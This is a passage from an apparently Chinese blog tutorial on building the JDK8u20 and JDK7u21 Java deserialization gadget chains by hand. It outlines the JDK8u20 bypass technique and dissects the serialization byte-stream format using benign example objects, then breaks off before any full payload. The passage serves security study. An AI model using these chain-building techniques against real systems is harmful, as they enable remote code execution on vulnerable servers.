		data-flex-grow="422"
		data-flex-basis="1014px"
	
></p>
<p>不过由于<code>Java</code>采用的是<strong>先反序列化成员变量，后赋值</strong>的方式，因此在对象还未完成成员赋值的这段时间内，虚构成员是能够被其他成员引用的</p>
<p>因此，通过成员抛弃机制，我们可以向<code>Proxy</code>插入一个虚构的成员变量<code>tmpField</code>，值为<code>BeanContextSupport</code>。</p>
<p>结合上面<code>try-catch</code>嵌套绕过异常处理的特点，在<code>BeanContextSupport</code>的<code>objectAnnotation</code>数据块写入<code>AnnotationInvocationHandler</code>，这样我们在反序列化时就能得到一个临时的<code>AnnotationInvocationHandler</code>对象</p>
<p>然后我们要将其提取到<code>Proxy</code>的成员变量<code>h</code>中，因此<code>h</code>需要用<code>TC_REFERENCE</code>引用这个<code>AnnotationInvocationHandler</code>对象</p>
<p>整个思路都已经梳理完毕了，接着就是构造<code>JDK8u20</code>这条链子</p>
<h3 id="序列化协议浅析">序列化协议浅析</h3>
<p>手动修改序列化字节流需要对<code>Java</code>序列化协议有一定的了解，<a class="link" href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html"  target="_blank" rel="noopener"
    >官方文档</a> 对协议的格式有过详细介绍</p>
<p>对于一个常见的序列化字节流来说，它的结构大致如下</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#e06c75">STREAM_MAGIC</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0xac</span> <span style="color:#e06c75">ed</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">STREAM_VERSION</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x00</span> <span style="color:#d19a66">05</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">Contents</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">TC_OBJECT</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x73</span>				<span style="color:#7f848e">// 表示对象
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    	<span style="color:#e06c75">TC_CLASSDESC</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x72</span>			<span style="color:#7f848e">// 描述类
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    		<span style="color:#e06c75">classNmae</span>
</span></span><span style="display:flex;"><span>    		<span style="color:#e06c75">serialVersionUID</span>
</span></span><span style="display:flex;"><span>    		<span style="color:#e06c75">newHandle</span>
</span></span><span style="display:flex;"><span>    		<span style="color:#e06c75">classDescFlags</span>			<span style="color:#7f848e">// 类描述符
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    		<span style="color:#e06c75">fiedCount</span>				<span style="color:#7f848e">// 表示成员变量的个数
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    		<span style="color:#e06c75">Fields</span>					<span style="color:#7f848e">// 描述成员变量名、类型
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    		<span style="color:#e06c75">classAnnotation</span>			<span style="color:#7f848e">// 一般为 TC_ENDBLOCKDATA
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    		<span style="color:#e06c75">superClass</span>				<span style="color:#7f848e">// 描述父类, 父类成员变量的值一并存放在下面的 classdata
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#e06c75">newHandle</span>						<span style="color:#7f848e">// 可以理解为对象的索引
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#e06c75">classdata</span>						<span style="color:#7f848e">// 用于存放成员变量的值、额外写入的数据等
</span></span></span></code></pre></div><p><strong>classDescFlags</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#c678dd">final</span> <span style="color:#c678dd">static</span> <span style="color:#e5c07b">byte</span> <span style="color:#e06c75">SC_WRITE_METHOD</span> 	<span style="color:#56b6c2">=</span> <span style="color:#d19a66">0x01</span><span style="color:#56b6c2">;</span>    <span style="color:#7f848e">//类重写writeObject()方法，或者说添加额外数据, 有 SC_WRITE_METHOD
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span><span style="color:#c678dd">final</span> <span style="color:#c678dd">static</span> <span style="color:#e5c07b">byte</span> <span style="color:#e06c75">SC_SERIALIZABLE</span>	<span style="color:#56b6c2">=</span> <span style="color:#d19a66">0x02</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">final</span> <span style="color:#c678dd">static</span> <span style="color:#e5c07b">byte</span> <span style="color:#e06c75">SC_BLOCK_DATA</span> 	<span style="color:#56b6c2">=</span> <span style="color:#d19a66">0x08</span><span style="color:#56b6c2">;</span>    <span style="color:#7f848e">//if SC_EXTERNALIZABLE
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span><span style="color:#c678dd">final</span> <span style="color:#c678dd">static</span> <span style="color:#e5c07b">byte</span> <span style="color:#e06c75">SC_EXTERNALIZABLE</span>	<span style="color:#56b6c2">=</span> <span style="color:#d19a66">0x04</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">final</span> <span style="color:#c678dd">static</span> <span style="color:#e5c07b">byte</span> <span style="color:#e06c75">SC_ENUM</span> 			<span style="color:#56b6c2">=</span> <span style="color:#d19a66">0x10</span><span style="color:#56b6c2">;</span>
</span></span></code></pre></div><p><strong>引用 TC_REFERENCE</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#e06c75">TC_REFERENCE</span> <span style="color:#e06c75">newhandle</span>
</span></span></code></pre></div><p><strong>示例</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#c678dd">public</span> <span style="color:#c678dd">class</span> <span style="color:#e5c07b">SerializationAnalysis</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">main</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">String</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">args</span><span style="color:#56b6c2">)</span> <span style="color:#c678dd">throws</span> <span style="color:#e06c75">IOException</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Person</span> <span style="color:#e06c75">person</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">Person</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ByteArrayOutputStream</span> <span style="color:#e06c75">byteArrayOutputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ByteArrayOutputStream</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ObjectOutputStream</span> <span style="color:#e06c75">objectOutputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ObjectOutputStream</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">byteArrayOutputStream</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">objectOutputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeObject</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">person</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">objectOutputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeObject</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">person</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">System</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">out</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">println</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">HexBin</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">encode</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">byteArrayOutputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">toByteArray</span><span style="color:#56b6c2">()));</span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">//ACED00057372001C53657269616C697A6174696F6E416E616C7973697324506572736F6EA874F222FC4E0D2B0200024900036167654C00046E616D657400124C6A6176612F6C616E672F537472696E673B78700000001274000373756E71007E0002
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">static</span> <span style="color:#c678dd">class</span> <span style="color:#e5c07b">Person</span> <span style="color:#c678dd">implements</span> <span style="color:#e06c75">Serializable</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">int</span> <span style="color:#e06c75">age</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">String</span> <span style="color:#e06c75">name</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">public</span> <span style="color:#61afef;font-weight:bold">Person</span><span style="color:#56b6c2">(){</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">this</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">age</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">18</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">this</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">name</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;sun&#34;</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span><span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p>用 <code>SerializationDumper</code>  或者 <code>zker</code>解析</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#e06c75">STREAM_MAGIC</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0xac</span> <span style="color:#e06c75">ed</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">STREAM_VERSION</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x00</span> <span style="color:#d19a66">05</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">Contents</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">TC_OBJECT</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x73</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">TC_CLASSDESC</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x72</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">className</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Length</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">28</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x00</span> <span style="color:#d19a66">1</span><span style="color:#e06c75">c</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Value</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">SerializationAnalysis$Person</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x53657269616c697a6174696f6e416e616c7973697324506572736f6e</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">serialVersionUID</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0xa8</span> <span style="color:#d19a66">74</span> <span style="color:#e06c75">f2</span> <span style="color:#d19a66">22</span> <span style="color:#e06c75">fc</span> <span style="color:#d19a66">4</span><span style="color:#e06c75">e</span> <span style="color:#d19a66">0d</span> <span style="color:#d19a66">2</span><span style="color:#e06c75">b</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">newHandle</span> <span style="color:#d19a66">0x00</span> <span style="color:#d19a66">7</span><span style="color:#e06c75">e</span> <span style="color:#d19a66">00</span> <span style="color:#d19a66">00</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">classDescFlags</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x02</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">SC_SERIALIZABLE</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">fieldCount</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">2</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x00</span> <span style="color:#d19a66">02</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">Fields</span>
</span></span><span style="display:flex;"><span>        <span style="color:#d19a66">0</span><span style="color:#56b6c2">:</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">Int</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">I</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x49</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">fieldName</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">Length</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">3</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x00</span> <span style="color:#d19a66">03</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">Value</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">age</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x616765</span>
</span></span><span style="display:flex;"><span>        <span style="color:#d19a66">1</span><span style="color:#56b6c2">:</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">Object</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">L</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x4c</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">fieldName</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">Length</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">4</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x00</span> <span style="color:#d19a66">04</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">Value</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">name</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x6e616d65</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">className1</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">TC_STRING</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x74</span>
</span></span><span style="display:flex;"><span>              <span style="color:#e06c75">newHandle</span> <span style="color:#d19a66">0x00</span> <span style="color:#d19a66">7</span><span style="color:#e06c75">e</span> <span style="color:#d19a66">00</span> <span style="color:#d19a66">01</span>
</span></span><span style="display:flex;"><span>              <span style="color:#e06c75">Length</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">18</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x00</span> <span style="color:#d19a66">12</span>
</span></span><span style="display:flex;"><span>              <span style="color:#e06c75">Value</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">Ljava</span><span style="color:#56b6c2">/</span><span style="color:#e06c75">lang</span><span style="color:#56b6c2">/</span><span style="color:#e06c75">String</span><span style="color:#56b6c2">;</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x4c6a6176612f6c616e672f537472696e673b</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">classAnnotations</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">TC_ENDBLOCKDATA</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x78</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">superClassDesc</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">TC_NULL</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x70</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">newHandle</span> <span style="color:#d19a66">0x00</span> <span style="color:#d19a66">7</span><span style="color:#e06c75">e</span> <span style="color:#d19a66">00</span> <span style="color:#d19a66">02</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">classdata</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">SerializationAnalysis$Person</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">values</span>
</span></span><span style="display:flex;"><span>          <span style="color:#61afef;font-weight:bold">age</span>
</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">(</span><span style="color:#e5c07b">int</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">18</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x00</span> <span style="color:#d19a66">00</span> <span style="color:#d19a66">00</span> <span style="color:#d19a66">12</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">name</span>
</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">(</span><span style="color:#e06c75">object</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>              <span style="color:#e06c75">TC_STRING</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x74</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">newHandle</span> <span style="color:#d19a66">0x00</span> <span style="color:#d19a66">7</span><span style="color:#e06c75">e</span> <span style="color:#d19a66">00</span> <span style="color:#d19a66">03</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">Length</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">3</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x00</span> <span style="color:#d19a66">03</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">Value</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">sun</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x73756e</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">TC_REFERENCE</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x71</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">Handle</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">8257538</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x00</span> <span style="color:#d19a66">7</span><span style="color:#e06c75">e</span> <span style="color:#d19a66">00</span> <span style="color:#d19a66">02</span>
</span></span></code></pre></div><p>由于都是<code>Person</code>对象，因此第二个对象直接引用了第一个对象</p>
<h3 id="手搓jdk7u21链">手搓JDK7u21链</h3>
<p>为了降低难度，我们最好手搓一段<code>JDK7u21</code>链的序列化字节流来加深理解。</p>
<p>我们可以先了解一下<code>LinkedHashSet</code>的大致结构，再来构造我们的字节流</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">com.sun.org.apache.xerces.internal.impl.dv.util.HexBin</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">java.io.*</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">java.util.LinkedHashSet</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">public</span> <span style="color:#c678dd">class</span> <span style="color:#e5c07b">SerializationAnalysis</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">main</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">String</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">args</span><span style="color:#56b6c2">)</span> <span style="color:#c678dd">throws</span> <span style="color:#e06c75">IOException</span><span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">HashMap</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">Object</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">hashMap</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">HashMap</span><span style="color:#56b6c2">&lt;&gt;();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">LinkedHashSet</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">Object</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">linkedHashSet</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">LinkedHashSet</span><span style="color:#56b6c2">&lt;&gt;();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">linkedHashSet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">add</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">hashMap</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ByteArrayOutputStream</span> <span style="color:#e06c75">byteArrayOutputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ByteArrayOutputStream</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ObjectOutputStream</span> <span style="color:#e06c75">objectOutputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ObjectOutputStream</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">byteArrayOutputStream</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">objectOutputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeObject</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">linkedHashSet</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">System</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">out</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">println</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">HexBin</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">encode</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">byteArrayOutputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">toByteArray</span><span style="color:#56b6c2">()));</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span><span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p><code>SerializationDumper</code>解析字节流</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#e06c75">STREAM_MAGIC</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0xac</span> <span style="color:#e06c75">ed</span>		<span style="color:#7f848e">//魔数
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span><span style="color:#e06c75">STREAM_VERSION</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x00</span> <span style="color:#d19a66">05</span>	<span style="color:#7f848e">//版本号
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span><span style="color:#e06c75">Contents</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">TC_OBJECT</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x73</span>		<span style="color:#7f848e">//表示为对象
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#e06c75">TC_CLASSDESC</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x72</span>		<span style="color:#7f848e">//描述类
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>      <span style="color:#e06c75">className</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Length</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">23</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x00</span> <span style="color:#d19a66">17</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Value</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">java</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">LinkedHashSet</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x6a6176612e7574696c2e4c696e6b656448617368536574</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">serialVersionUID</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0xd8</span> <span style="color:#d19a66">6</span><span style="color:#e06c75">c</span> <span style="color:#e06c75">d7</span> <span style="color:#d19a66">5</span><span style="color:#e06c75">a</span> <span style="color:#d19a66">95</span> <span style="color:#e06c75">dd</span> <span style="color:#d19a66">2</span><span style="color:#e06c75">a</span> <span style="color:#d19a66">1</span><span style="color:#e06c75">e</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">newHandle</span> <span style="color:#d19a66">0x00</span> <span style="color:#d19a66">7</span><span style="color:#e06c75">e</span> <span style="color:#d19a66">00</span> <span style="color:#d19a66">00</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">classDescFlags</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x02</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">SC_SERIALIZABLE</span>	<span style="color:#7f848e">//类描述符
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>      <span style="color:#e06c75">fieldCount</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x00</span> <span style="color:#d19a66">00</span>	<span style="color:#7f848e">//成员变量个数
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>      <span style="color:#e06c75">classAnnotations</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">TC_ENDBLOCKDATA</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x78</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">superClassDesc</span>	<span style="color:#7f848e">//描述类
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#e06c75">TC_CLASSDESC</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x72</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">className</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">Length</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">17</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x00</span> <span style="color:#d19a66">11</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">Value</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">java</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">HashSet</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x6a6176612e7574696c2e48617368536574</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">serialVersionUID</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0xba</span> <span style="color:#d19a66">44</span> <span style="color:#d19a66">85</span> <span style="color:#d19a66">95</span> <span style="color:#d19a66">96</span> <span style="color:#e06c75">b8</span> <span style="color:#e06c75">b7</span> <span style="color:#d19a66">34</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">newHandle</span> <span style="color:#d19a66">0x00</span> <span style="color:#d19a66">7</span><span style="color:#e06c75">e</span> <span style="color:#d19a66">00</span> <span style="color:#d19a66">01</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">classDescFlags</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x03</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">SC_WRITE_METHOD</span> <span style="color:#56b6c2">|</span> <span style="color:#e06c75">SC_SERIALIZABLE</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">fieldCount</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x00</span> <span style="color:#d19a66">00</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">classAnnotations</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">TC_ENDBLOCKDATA</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x78</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">superClassDesc</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">TC_NULL</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x70</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">newHandle</span> <span style="color:#d19a66">0x00</span> <span style="color:#d19a66">7</span><span style="color:#e06c75">e</span> <span style="color:#d19a66">00</span> <span style="color:#d19a66">02</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">classdata</span>
